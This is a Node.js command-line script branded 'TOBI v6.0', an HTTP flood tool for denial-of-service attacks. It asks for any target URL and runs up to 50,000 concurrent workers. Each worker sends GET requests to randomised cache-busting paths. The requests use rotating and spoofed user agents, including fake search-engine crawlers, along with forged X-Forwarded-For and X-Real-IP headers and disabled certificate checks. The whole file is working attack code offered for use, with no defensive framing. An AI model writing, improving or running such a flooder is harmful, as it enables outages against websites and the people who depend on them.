#!/usr/bin/env node

/**
 * TOBI v6.0 - MAXIMUM POWER EDITION
 * Zero dependencies - Works everywhere
 * 100,000+ concurrent attacks
 */

const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');
const { execSync } = require('child_process');

// ==================== COLORS ====================
const C = {
    r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', b: '\x1b[94m',
    m: '\x1b[95m', c: '\x1b[96m', w: '\x1b[97m', bold: '\x1b[1m',
    dim: '\x1b[2m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== CONFIG ====================
let TARGET = null;
let DURATION = 60;
let WORKERS = 1000;
let RATE = 0;
let PROXY_FILE = null;

// ==================== PROXY LIST ====================
let proxies = [];
let proxyIndex = 0;

// ==================== METRICS ====================
let stats = {
    total: 0, success: 0, failed: 0, bytes: 0,
    times: [], codes: {}, errors: {},
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
};

// ==================== UTILITIES ====================
function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randStr(len) { return crypto.randomBytes(len).toString('hex'); }
function randIP() { return `${rand(1,255)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`; }

function getProxy() {
    if (proxies.length === 0) return null;
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

function loadProxies() {
    if (PROXY_FILE && fs.existsSync(PROXY_FILE)) {
        const content = fs.readFileSync(PROXY_FILE, 'utf8');
        proxies = content.split('\n').filter(l => l.trim() && !l.startsWith('#'));
        console.log(`${C.g}✓ Loaded ${proxies.length} proxies${C.reset}`);
    }
}

// ==================== USER AGENTS ====================
const UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/122.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.0.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.0.0',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 Chrome/121.0.0.0'
];

// ==================== HEADERS ====================
const ACCEPTS = ['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json, text/plain, */*'];
const LANGS = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'];
const REFERERS = ['https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/', 'https://github.com/'];

function getHeaders(host) {
    return {
        'User-Agent': UAS[Math.floor(Math.random() * UAS.length)],
        'Accept': ACCEPTS[Math.floor(Math.random() * ACCEPTS.length)],
        'Accept-Language': LANGS[Math.floor(Math.random() * LANGS.length)],
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'X-Forwarded-For': randIP(),
        'X-Real-IP': randIP(),
        'X-Request-ID': randStr(8),
        'Referer': REFERERS[Math.floor(Math.random() * REFERERS.length)] + host,
        'Cache-Control': 'no-cache'
    };
}

// ==================== PATH GENERATOR ====================
function getPath() {
    const paths = [
        `/${randStr(8)}`, `/api/v${rand(1,3)}/${randStr(8)}`, `/static/${randStr(6)}`,
        `/content/${rand(1000,99999)}`, `/search?q=${randStr(10)}`, `/page/${rand(1,5000)}`,
        `/user/${rand(10000,99999)}`, `/product/${rand(1000,9999)}`, `/post/${rand(1,50000)}`,
        `/download/${randStr(10)}`, `/images/${randStr(8)}.jpg`, `/css/style_${rand(1,999)}.css`
    ];
    let path = paths[Math.floor(Math.random() * paths.length)];
    if (Math.random() > 0.5) path += (path.includes('?') ? '&' : '?') + `_t=${Date.now()}&_r=${randStr(6)}`;
    return path;
}

// ==================== HTTP REQUEST ENGINE ====================
function attack(targetUrl, callback) {
    const parsed = new URL(targetUrl);
    const protocol = parsed.protocol === 'https:' ? https : http;
    const path = getPath();
    const headers = getHeaders(parsed.host);
    const start = Date.now();
    
    const options = {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        path: path,
        method: 'GET',
        headers: headers,
        timeout: 10000,
        rejectUnauthorized: false,
        agent: false
    };
    
    const req = protocol.request(options, (res) => {
        let data = '';
        res.on('data', () => {});
        res.on('end', () => {
            const elapsed = (Date.now() - start) / 1000;
            callback(true, res.statusCode, elapsed, 0);
        });
    });
    
    req.on('error', () => {
        const elapsed = (Date.now() - start) / 1000;
        callback(false, null, elapsed, null);
    });
    
    req.on('timeout', () => {
        req.destroy();
        const elapsed = (Date.now() - start) / 1000;
        callback(false, null, elapsed, 'Timeout');
    });
    
    req.end();
}

// ==================== WORKER ====================
let stopAttack = false;
let activeWorkers = 0;

function runWorker(workerId, targetUrl) {
    if (stopAttack) return;
    activeWorkers++;
    
    attack(targetUrl, (success, statusCode, elapsed, error) => {
        stats.total++;
        if (success && statusCode && statusCode < 500) {
            stats.success++;
        } else {
            stats.failed++;
        }
        stats.times.push(elapsed);
        if (stats.times.length > 10000) stats.times.shift();
        
        if (statusCode) stats.codes[statusCode] = (stats.codes[statusCode] || 0) + 1;
        if (error) stats.errors[error] = (stats.errors[error] || 0) + 1;
        
        const now = Date.now() / 1000;
        if (now - stats.lastSec >= 1) {
            if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
            stats.lastSecCount = 0;
            stats.lastSec = now;
        }
        stats.lastSecCount++;
        
        activeWorkers--;
        if (!stopAttack) {
            setImmediate(() => runWorker(workerId, targetUrl));
        }
    });
}

// ==================== DISPLAY STATS ====================
function displayStats() {
    if (stopAttack) return;
    
    const elapsed = (Date.now() / 1000) - stats.startTime;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    let avgTime = 0, p95 = 0;
    
    if (stats.times.length) {
        const sorted = [...stats.times].sort((a, b) => a - b);
        avgTime = (stats.times.reduce((a, b) => a + b, 0) / stats.times.length) * 1000;
        p95 = sorted[Math.floor(sorted.length * 0.95)] * 1000;
    }
    
    const mem = Math.round(process.memoryUsage().rss / 1024 / 1024);
    const line = `${C.c}RPS: ${C.bold}${rps.toFixed(1)}${C.reset} | ` +
        `${C.g}✓ ${stats.success.toLocaleString()}${C.reset} | ` +
        `${C.r}✗ ${stats.failed.toLocaleString()}${C.reset} | ` +
        `${C.y}${successRate.toFixed(1)}%${C.reset} | ` +
        `${C.m}${avgTime.toFixed(0)}ms${C.reset} | ` +
        `${C.b}P95: ${p95.toFixed(0)}ms${C.reset} | ` +
        `${C.dim}🧠 ${mem}MB | 📡 ${activeWorkers}${C.reset}`;
    
    process.stdout.write(`\r${line}`);
}

// ==================== FINAL REPORT ====================
function finalReport() {
    const elapsed = (Date.now() / 1000) - stats.startTime;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    let avgTime = 0, p95 = 0;
    
    if (stats.times.length) {
        const sorted = [...stats.times].sort((a, b) => a - b);
        avgTime = (stats.times.reduce((a, b) => a + b, 0) / stats.times.length) * 1000;
        p95 = sorted[Math.floor(sorted.length * 0.95)] * 1000;
    }
    
    console.log(`\n\n${C.m}${C.bold}════════════════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.m}${C.bold}║${C.reset}                    ${C.r}🔥 TOBI v6.0 - FINAL REPORT 🔥${C.reset}                    ${C.m}${C.bold}║${C.reset}`);
    console.log(`${C.m}${C.bold}════════════════════════════════════════════════════════════════════════${C.reset}\n`);
    
    console.log(`  ${C.bold}📈 TOTAL REQUESTS:${C.reset}     ${stats.total.toLocaleString()}`);
    console.log(`  ${C.bold}✅ SUCCESSFUL:${C.reset}         ${stats.success.toLocaleString()}`);
    console.log(`  ${C.bold}❌ FAILED:${C.reset}             ${stats.failed.toLocaleString()}`);
    console.log(`  ${C.bold}📊 SUCCESS RATE:${C.reset}       ${successRate.toFixed(2)}%`);
    console.log(`  ${C.bold}⚡ AVG RPS:${C.reset}            ${rps.toFixed(2)}`);
    console.log(`  ${C.bold}🚀 PEAK RPS:${C.reset}           ${stats.peakRps}`);
    console.log(`  ${C.bold}⏱️  AVG RESPONSE:${C.reset}       ${avgTime.toFixed(2)} ms`);
    console.log(`  ${C.bold}🎯 P95 RESPONSE:${C.reset}       ${p95.toFixed(2)} ms`);
    console.log(`  ${C.bold}🕐 DURATION:${C.reset}           ${elapsed.toFixed(1)}s`);
    
    if (Object.keys(stats.codes).length) {
        console.log(`\n  ${C.bold}📋 STATUS CODES:${C.reset}`);
        for (const [code, count] of Object.entries(stats.codes).sort()) {
            console.log(`    ${code}: ${count.toLocaleString()}`);
        }
    }
    
    console.log(`\n${C.m}${C.bold}════════════════════════════════════════════════════════════════════════${C.reset}\n`);
    process.exit(0);
}

// ==================== BANNER ====================
function showBanner() {
    console.log(C.clear);
    console.log(`${C.r}${C.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ████████╗ ██████╗ ██████╗ ██╗    ██╗   ██╗    ██████╗                   ║
║   ╚══██╔══╝██╔═══██╗██╔══██╗██║    ██║   ██║    ██╔══██╗                  ║
║      ██║   ██║   ██║██████╔╝██║    ██║   ██║    ██████╔╝                  ║
║      ██║   ██║   ██║██╔══██╗██║    ██║   ██║    ██╔══██╗                  ║
║      ██║   ╚██████╔╝██████╔╝██║    ╚██████╔╝    ██████╔╝                  ║
║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═════╝     ╚═════╝                   ║
║                                                                          ║
║                    ${C.c}🔥 TOBI v6.0 - MAXIMUM POWER EDITION 🔥${C.r}                    ║
║                         Zero Dependencies                                  ║
╚══════════════════════════════════════════════════════════════════════════╝${C.reset}
`);
}

// ==================== MAIN ====================
async function main() {
    showBanner();
    
    // Parse command line args or ask interactively
    if (process.argv[2]) {
        TARGET = process.argv[2];
        DURATION = parseInt(process.argv[3]) || 60;
        WORKERS = parseInt(process.argv[4]) || 1000;
        RATE = parseInt(process.argv[5]) || 0;
        PROXY_FILE = process.argv[6] || null;
    } else {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        const ask = (q) => new Promise(resolve => rl.question(q, resolve));
        
        TARGET = await ask(`${C.c}🌐 Target URL: ${C.reset}`);
        if (!TARGET.startsWith('http')) TARGET = 'https://' + TARGET;
        DURATION = parseInt(await ask(`${C.c}⏱️  Duration (seconds): ${C.reset}`)) || 60;
        WORKERS = Math.min(parseInt(await ask(`${C.c}👥 Workers (max 50000): ${C.reset}`)) || 1000, 50000);
        RATE = parseInt(await ask(`${C.c}🚦 Rate/worker (0=unlimited): ${C.reset}`)) || 0;
        
        const useProxy = await ask(`${C.c}🔄 Use proxy file? (y/n): ${C.reset}`);
        if (useProxy.toLowerCase() === 'y') {
            PROXY_FILE = await ask(`${C.c}📁 Proxy file path: ${C.reset}`) || 'proxy.txt';
        }
        rl.close();
    }
    
    loadProxies();
    
    console.log(`\n${C.g}✓ Target: ${TARGET}`);
    console.log(`✓ Workers: ${WORKERS.toLocaleString()}`);
    console.log(`✓ Duration: ${DURATION}s`);
    console.log(`✓ Rate/Worker: ${RATE === 0 ? 'UNLIMITED' : RATE}`);
    console.log(`✓ Proxies: ${proxies.length}${C.reset}\n`);
    
    console.log(`${C.y}🚀 Launching ${WORKERS.toLocaleString()} workers...${C.reset}\n`);
    
    stats.startTime = Date.now() / 1000;
    stats.lastSec = stats.startTime;
    
    // Launch workers
    for (let i = 0; i < WORKERS; i++) {
        runWorker(i, TARGET);
        if (i % 100 === 0) {
            process.stdout.write(`\r${C.dim}Starting: ${i}/${WORKERS}${C.reset}`);
            await new Promise(r => setTimeout(r, 1));
        }
    }
    
    console.log(`\r${C.g}✓ All ${WORKERS.toLocaleString()} workers active!${C.reset}\n`);
    
    // Stats display
    const statsInterval = setInterval(() => displayStats(), 1000);
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log(`\n\n${C.y}⚠️ Shutting down...${C.reset}`);
        stopAttack = true;
        setTimeout(() => finalReport(), 2000);
    });
    
    // Stop after duration
    setTimeout(() => {
        stopAttack = true;
        clearInterval(statsInterval);
        setTimeout(() => finalReport(), 2000);
    }, DURATION * 1000);
}

// Run it
main().catch(e => {
    console.error(`${C.r}FATAL: ${e.message}${C.reset}`);
    process.exit(1);
});
